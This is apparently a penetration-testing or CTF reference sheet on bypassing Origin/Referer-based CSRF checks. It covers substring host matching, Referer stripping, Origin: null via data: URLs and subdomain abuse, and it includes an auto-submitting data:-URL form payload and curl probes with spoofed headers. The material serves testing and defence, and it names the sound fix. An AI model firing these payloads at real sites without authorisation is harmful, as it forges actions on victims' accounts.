# Origin / Referer checks — the header gate and its gaps

Some apps check `Origin` or `Referer` instead of a CSRF token —
"the request must come from my own site". The check is only as
strong as what it actually compares, and the browser sets both
headers in ways the app doesn't control.

---

## 1. The headers themselves

```text
Origin:  https://attacker.com          → the scheme+host+port of the
                                          page that issued the request
Referer: https://attacker.com/x?y=z   → the FULL url of the page —
                                          includes path+query
```

`Origin` is set on POST/PUT/DELETE cross-origin navigations and on
`fetch`/`xhr` with a body; absent on same-origin GET. `Referer` is
set per the referrer-policy — it can be missing entirely.

## 2. The check shapes that fail

```js
// the naive checks and why each fails
if (req.headers.referer.includes('target.com'))      // contains —
  // 'https://target.com.attacker.com' passes
if (req.headers.referer.startsWith('https://target.com'))  // prefix —
  // 'https://target.com.attacker.com' passes; but not
  // 'https://attacker.com' — the check needs exact host
if (new URL(req.headers.referer).hostname === 'target.com') // exact host —
  // solid for the header ITSELF — but the header can be MISSING
if (!req.headers.origin) { allow }                    // absent → allow!
  // a same-origin GET has no Origin; a stripped-Origin request
  // via fetch(..., {headers: {Origin: null}})? Origin can't be
  // JS-set — but a SAME-ORIGIN request may omit it
```

The two real gaps:
1. **Substring/prefix matching** — `referer.includes('target.com')`
   passes `target.com.evil.com`, `evil.com/target.com`, `evil-target.com`.
2. **Absent-is-allow** — `if (!origin) allow` — a request with no
   Origin header at all bypasses; `Origin: null` (the opaque-origin
   value) sometimes parses as falsy too.

## 3. The "make the header absent" tricks

```html
<!-- a navigation from a page with no Referer policy -->
<meta name="referrer" content="no-referrer">
<form action="https://target/change" method="POST">
<!-- the form posts with NO Referer header — if the check is
     'absent → allow', it passes -->

<!-- data: URL — no referer -->
<script>location='data:text/html,<form ...>...</form>'</script>

<!-- a redirect through a referrer-stripping hop -->
<a href="data:text/html,<script>location='https://target/change'</script>">
<!-- javascript: pseudo-scheme — no referrer in some engines -->
```

`Origin` can't be removed by JS — it's browser-set — but `Referer`
CAN be suppressed by `<meta name="referrer" content="no-referrer">`,
a `Referrer-Policy: no-referrer` response, or a `data:`/`about:`/
`javascript:` origin. When the check is `if (referer missing) allow`,
stripping Referer is the bypass.

## 4. The `Origin: null` shape

```text
Origin: null
```

Sent by requests from opaque origins — `data:` URLs, sandboxed
iframes, `file:` pages, `blob:`/`javascript:` contexts. If the
server's check treats `null` as absent or doesn't compare it
exactly, a `data:`-origin page's request passes.

```html
<script>
location = 'data:text/html,<form action="https://target/x" method="POST">'
        + '<input name=a value=1></form><script>document.forms[0].submit()<\/script>';
</script>
<!-- the POST's Origin is 'null' — an absent-origin check passes -->
```

## 5. The host-comparison bypasses

```text
referer.includes('target.com')     → 'https://target.com.evil.com'
                                     'https://evil.com/target.com/'
                                     'https://evil-target.com'
                                     'https://target.com@evil.com'
                                     'https://evil.com?target.com'
new URL(r).hostname.endsWith('target.com')  → 'eviltarget.com'
new URL(r).hostname === 'target.com'        → exact — solid on the
                                              header it sees
parse the referer's HOST, not the string    → 'https://target.com.evil'
                                              host is eviltarget.com
                                              — but naive includes()
                                              still passes it
```

## 6. The "the check runs on the wrong layer" cases

```text
the middleware checks Origin but the endpoint doesn't    → route around the middleware
the check is only on some methods                         → GET vs POST asymmetry
the check is only on some routes                          → an unguarded sibling route
the check compares to a wildcard subdomain                → *.target.com covers eviltarget.com? no — *. needs a dot —
                                                          'eviltarget.com' fails; 'x.target.com' is allowed — a
                                                          subdomain-takeover or a trusted-subdomain CSRF
the check reads X-Forwarded-Host/X-Origin                 → a proxy header the attacker sets
the check reads Origin on the INTERNAL side               → the proxy's own origin — always 'same'
```

## 7. The sibling-subdomain bypass

```text
check: referer host === '*.target.com' (any subdomain)
attacker controls evil.target.com (subdomain takeover, a shared
hosting subdomain, or the challenge ships a sibling service)
→ the CSRF page lives on evil.target.com — its Referer passes
   the wildcard check
```

The check `host.endsWith('.target.com')` or a wildcard match opens
every subdomain — a subdomain-XSS, a subdomain-takeover, or a
deliberately-shipped sibling app is the carrier.

## 8. The "Origin present but unenforced" — the most common gap

```text
Origin: https://attacker.com    → present, but the server doesn't
                                  check it — the request processes
                                  normally
```

`csrf_probe` sends a foreign-Origin replay to measure exactly this —
if the endpoint answers the same as same-origin, the Origin header
is decorative. The most common real-world gap: the header is there
and ignored.

## 9. The browser-side rules

- `Origin` is always set on cross-origin POST/PUT/DELETE/fetch;
  a same-origin GET omits it — `absent → allow` fails open
- `Referer` is per referrer-policy — suppressible by the page
- a redirect preserves Origin of the FIRST request (mostly) —
  attacker.com → target.com/redirect → target.com/endpoint keeps
  attacker.com's Origin — a redirect doesn't launder Origin
- `Origin: null` on opaque origins — `file:`, `data:`, sandboxed
  iframe, `blob:`/`javascript:`

## 10. The probe sequence

```bash
# 1. baseline — same-origin
curl -i -b "$COOKIE_JAR" -X POST "$BASE/x" -d 'a=1'
# 2. foreign Origin — is it read?
curl -i -b "$COOKIE_JAR" -X POST "$BASE/x" -d 'a=1' -H 'Origin: https://evil.com'
# 3. missing Origin — the fail-open test
curl -i -b "$COOKIE_JAR" -X POST "$BASE/x" -d 'a=1' -H 'Origin:'
# 4. foreign Referer
curl -i -b "$COOKIE_JAR" -X POST "$BASE/x" -d 'a=1' -H 'Referer: https://evil.com/'
# 5. spoofed-host Referer variants
for r in 'https://target.com.evil.com' 'https://evil.com/target.com' \
         'https://evil-target.com' 'null' ''; do
  curl -i -b "$COOKIE_JAR" -X POST "$BASE/x" -d 'a=1' -H "Referer: $r"; done
# 6. Origin: null
curl -i -b "$COOKIE_JAR" -X POST "$BASE/x" -d 'a=1' -H 'Origin: null'
```

Each status/behavior delta is the falsifier-measure — a 200 on all
of them = no Origin/Referer enforcement.

## 11. The falsifier

```text
The endpoint validates Origin/Referer EXACTLY (host-equality, not
substring) AND rejects absent/null — the header gate holds for
every cross-origin delivery. Combined with a required content-type
the form can't send, the class closes.
```

## 12. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "origin-gate: absent-referer or substring-host bypass"
```
